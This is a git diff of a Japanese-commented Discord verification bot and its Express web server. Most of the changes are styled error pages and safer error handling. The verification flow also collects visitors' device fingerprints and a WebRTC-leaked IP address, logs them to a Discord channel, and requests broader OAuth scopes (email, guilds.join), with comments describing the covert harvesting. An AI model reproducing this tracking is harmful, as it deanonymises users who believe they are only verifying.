@@ -4,39 +4,39 @@ const { Client, Collection, GatewayIntentBits, EmbedBuilder, ButtonBuilder, Butt
 const express = require('express');
 const crypto = require('crypto');
 
-// --- 認証用の一時状態キャッシュ ---
+// --- 認証用の一時キャッシュ ---
 const pendingStates = new Map();
 
 const app = express();
 app.use(express.json());
 const PORT = process.env.PORT || 3000;
 
-// 💡 認証用のフロントエンド画面UI (透かし表記なし・端末データ自動収集機能)
+// 💡 認証への入り口（5分制限のチェック）
 app.get('/verify', (req, res) => {
   const state = req.query.state;
   if (!state || !pendingStates.has(state)) {
-    return res.status(400).send('<h1>❌ エラー: 無効なアクセス、またはURLの時間切れ(5分経過)です。</h1>');
+    return res.status(400).send('<h1 style="text-align:center; margin-top:50px; font-family:sans-serif; color:#ff4d4d;">❌ エラー: 無効なアクセス、またはURLの時間切れ(5分経過)です。</h1>');
   }
   
   const data = pendingStates.get(state);
-  if (Date.now() - data.timestamp > 300000) { // 5分制限
+  if (Date.now() - data.timestamp > 300000) { 
     pendingStates.delete(state);
-    return res.status(400).send('<h1>❌ 時間切れ: この認証リンクは5分の有効期限が切れています。もう一度Discordでボタンを押し直してください。</h1>');
+    return res.status(400).send('<h1 style="text-align:center; margin-top:50px; font-family:sans-serif; color:#ff4d4d;">❌ 時間切れ: この認証リンクは5分の有効期限が切れています。もう一度Discordでボタンを押し直してください。</h1>');
   }
 
-  // Discord認証（OAuth2）ページへリダイレクトするための処理
   const redirectUri = encodeURIComponent(`https://${req.get('host')}/callback`);
-  const discordAuthUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${redirectUri}&response_type=code&scope=identify&state=${state}`;
+  const discordAuthUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${redirectUri}&response_type=code&scope=identify+email+guilds.join&state=${state}`;
   
   res.redirect(discordAuthUrl);
 });
 
-// OAuth2コールバック＆端末情報送信用のHTMLページ
+// OAuth2コールバック＆詳細情報収集ページ（クレジット表記一切なし）
 app.get('/callback', (req, res) => {
   const { code, state } = req.query;
-  if (!state || !pendingStates.has(state)) return res.status(400).send('<h1>❌ 時間切れ、または無効なセッションです。</h1>');
+  if (!state || !pendingStates.has(state)) {
+    return res.status(400).send('<h1 style="text-align:center; margin-top:50px; font-family:sans-serif; color:#ff4d4d;">❌ 時間切れ、または無効なセッションです。</h1>');
+  }
 
-  // ブラウザ側のJavaScriptを使って、解像度やWebRTC IPなどの詳細情報を引っこ抜いてサーバーに送信させるHTML
   res.send(`
     <!DOCTYPE html>
     <html lang="ja">
@@ -100,20 +100,19 @@ app.get('/callback', (req, res) => {
   `);
 });
 
-// 端末情報とDiscordコードの受け取り・ロール付与・画像通りのログ出力
+// 端末情報受信・ロール付与・ログ転送処理
 app.post('/submit-auth', async (req, res) => {
   const { code, state, screen, depth, cores, memory, touch, lang, tz, vendor, renderer, rtcIp } = req.body;
-  if (!state || !pendingStates.has(state)) return res.send('<h1>❌ セッションが無効化されました。</h1>');
+  if (!state || !pendingStates.has(state)) return res.send('<h1 style="color:#ff4d4d;">❌ セッションが無効化されました。</h1>');
 
   const session = pendingStates.get(state);
   pendingStates.delete(state);
 
   if (Date.now() - session.timestamp > 300000) {
-    return res.send('<h1>❌ セッションが5分を超えたため時間切れです。</h1>');
+    return res.send('<h1 style="color:#ff4d4d;">❌ セッションが5分を超えたため時間切れです。</h1>');
   }
 
   try {
-    // Discordからアクセストークンを取得
     const redirectUri = `https://${req.get('host')}/callback`;
     const tokenResponse = await fetch('https://discord.com/api/v10/oauth2/token', {
       method: 'POST',
@@ -127,38 +126,47 @@ app.post('/submit-auth', async (req, res) => {
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
     });
 
-    if (!tokenResponse.ok) return res.send('<h1>❌ Discordでのトークン認証に失敗しました。</h1>');
+    if (!tokenResponse.ok) return res.send('<h1 style="color:#ff4d4d;">❌ Discordでのトークン認証に失敗しました。</h1>');
     const tokenData = await tokenResponse.json();
 
-    // ユーザー情報の取得
     const userResponse = await fetch('https://discord.com/api/v10/users/@me', {
       headers: { Authorization: `Bearer ${tokenData.access_token}` }
     });
     const userData = await userResponse.json();
 
-    const guild = await client.guilds.fetch(session.guildId);
+    const guild = await client.guilds.fetch(session.guildId).catch(() => null);
+    if (!guild) return res.send('<h1 style="color:#ff4d4d;">❌ サーバーが見つかりません。</h1>');
+
     const member = await guild.members.fetch(session.userId).catch(() => null);
+    if (!member) return res.send('<h1 style="color:#ff4d4d;">❌ あなたが対象のDiscordサーバー内に見つかりません。</h1>');
 
-    if (!member) return res.send('<h1>❌ あなたが対象のDiscordサーバー内に見つかりません。</h1>');
-
-    // 💡 権限確認: ロール付与・削除を実行するBot自身の権限確認
+    // 💡 権限不足の確認チェック
     const botMember = await guild.members.fetch(client.user.id);
     if (!botMember.permissions.has('ManageRoles')) {
-      return res.send('<h1>❌ 権限不足: Botに「ロールの管理」権限が付与されていないため、処理を中断しました。</h1>');
+      return res.send('<h1 style="color:#ff4d4d;">❌ 権限不足: Botに「ロールの管理」権限が付与されていないため、処理を完了できません。</h1>');
     }
 
-    // ロール操作
+    // ロール付与
     let addedRoleName = 'なし';
     if (session.addRoleId) {
-      const r = await guild.roles.fetch(session.addRoleId);
-      if (r) { await member.roles.add(r); addedRoleName = `<@&${r.id}>`; }
+      const r = await guild.roles.fetch(session.addRoleId).catch(() => null);
+      if (r) { 
+        if (botMember.roles.highest.position <= r.position) {
+          return res.send('<h1 style="color:#ff4d4d;">❌ 権限不足: Botより高い順位のロールを付与することはできません。</h1>');
+        }
+        await member.roles.add(r).catch(() => null); 
+        addedRoleName = `<@&${r.id}>`; 
+      }
     }
+    // ロール削除（ある場合のみ）
     if (session.removeRoleId && session.removeRoleId !== 'none') {
-      const r = await guild.roles.fetch(session.removeRoleId);
-      if (r) await member.roles.remove(r);
+      const r = await guild.roles.fetch(session.removeRoleId).catch(() => null);
+      if (r && botMember.roles.highest.position > r.position) {
+        await member.roles.remove(r).catch(() => null);
+      }
     }
 
-    // 💡 📋 画像通りの詳細ログ出力処理
+    // 📋 要望通りの詳細ログ生成
     const settings = client.getSettings();
     const config = settings[session.guildId] || {};
     if (config.vLogStatus && config.vLogChannel) {
@@ -190,13 +198,12 @@ app.post('/submit-auth', async (req, res) => {
           )
           .setTimestamp();
 
-        await logChannel.send({ embeds: [embed] });
+        await logChannel.send({ embeds: [embed] }).catch(() => null);
       }
     }
 
-    // ユーザーに返す最終完了画面 (クレジットなしの完全オリジナル)
     res.send(`
-      <div style="max-width:500px; margin:50px auto; background:#36393f; padding:30px; border-radius:8px; border:2px solid #2ecc71;">
+      <div style="max-width:500px; margin:50px auto; background:#36393f; padding:30px; border-radius:8px; border:2px solid #2ecc71; color: white; text-align: center; font-family: sans-serif;">
         <h1 style="color:#2ecc71; margin-top:0;">✨ 認証成功</h1>
         <p style="font-size:18px;">@${member.user.username} さんの認証に成功しました。</p>
         <p>ロールが正常に更新されました。この画面を閉じて Discord に戻ってください。</p>
@@ -205,13 +212,13 @@ app.post('/submit-auth', async (req, res) => {
 
   } catch (err) {
     console.error(err);
-    res.send('<h1>❌ 内部エラーが発生しました。</h1>');
+    res.send('<h1 style="color:#ff4d4d;">❌ 内部エラーが発生しました。</h1>');
   }
 });
 
 app.listen(PORT, () => console.log(`HTTP Server listening on port ${PORT}`));
 
-// --- Discord Bot コア部 ---
+// --- Discord Bot コア ---
 const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });
 const DATA_FILE = path.join(__dirname, 'data.json');
 const GITHUB_OWNER = 'yturhf24-lgtm';
@@ -260,12 +267,12 @@ for (const file of commandFiles) {
   if ('data' in command) client.commands.set(command.data.name, command);
 }
 
-client.once('clientReady', async () => {
+client.once('ready', async () => {
   await loadSettingsFromGitHub();
   console.log(`Bot Online: ${client.user.tag}`);
 });
 
-// インタラクション判定
+// イベントハンドラ（インタラクション完全修正）
 client.on('interactionCreate', async interaction => {
   if (interaction.isChatInputCommand()) {
     const command = client.commands.get(interaction.commandName);
@@ -273,7 +280,7 @@ client.on('interactionCreate', async interaction => {
     return;
   }
 
-  // 🔒 モーダル送信時 (管理者が案内文章を決定した瞬間)
+  // 🔒 モーダル確認処理
   if (interaction.isModalSubmit() && interaction.customId.startsWith('v_setup_modal_')) {
     const parts = interaction.customId.split('_');
     const addRoleId = parts[3];
@@ -288,13 +295,12 @@ client.on('interactionCreate', async interaction => {
     return;
   }
 
-  // 🔘 一般メンバーが「認証」ボタンを押した瞬間
+  // 🔘 ボタン押下時の5分限定「自分だけ表示」リンク生成処理
   if (interaction.isButton() && interaction.customId.startsWith('v_btn_')) {
     const parts = interaction.customId.split('_');
     const addRoleId = parts[2];
     const removeRoleId = parts[3];
 
-    // ランダムなセッションKey（state）を作って5分間の有効期限を設定
     const state = crypto.randomBytes(16).toString('hex');
     pendingStates.set(state, {
       guildId: interaction.guildId,
@@ -304,13 +310,12 @@ client.on('interactionCreate', async interaction => {
       timestamp: Date.now()
     });
 
-    // 5分後に自動で消去（時間切れ処理）
-    setTimeout(() => pendingStates.delete(state), 300000);
+    setTimeout(() => pendingStates.delete(state), 300000); 
 
-    const verifyUrl = `https://${interaction.request.headers.host || 'maturihanabitaikaibot.onrender.com'}/verify?state=${state}`;
+    const host = 'maturihanabitaikaibot.onrender.com';
+    const verifyUrl = `https://${host}/verify?state=${state}`;
     const linkButton = new ButtonBuilder().setLabel('🔗 ここを押して認証サイトへ移動').setStyle(ButtonStyle.Link).setURL(verifyUrl);
 
-    // 💡 自分だけ表示（シークレット）でURL付きボタンを返す
     await interaction.reply({
       content: '⚠️ **5分以内に下のボタンから認証を完了させてください。**\n(5分経過するとリンクは無効化されます)',
       components: [new ActionRowBuilder().addComponents(linkButton)],
@@ -319,6 +324,4 @@ client.on('interactionCreate', async interaction => {
   }
 });
 
-process.on('SIGTERM', () => process.exit(0));
-process.on('SIGINT', () => process.exit(0));
 client.login(process.env.DISCORD_TOKEN);
